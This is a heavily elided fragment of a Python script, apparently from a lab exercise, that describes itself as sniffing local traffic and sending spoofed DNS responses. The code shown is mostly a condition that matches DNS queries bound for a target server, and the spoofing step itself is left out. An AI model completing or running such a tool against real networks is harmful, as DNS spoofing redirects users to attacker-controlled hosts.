#Python script that can be used to sniff and send spoofed DNS response to users locally
...
def usage():
	print(" Usage: ./task1 <interface> <Target DNS Server IP>")
...
def main():
	...
	while 1:
		...
		if ( getDNSPacket[0].haslayer(DNS) ) and ( getDNSPacket[0].getlayer(IP).dst == argv[2].strip()) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass== 1 ):
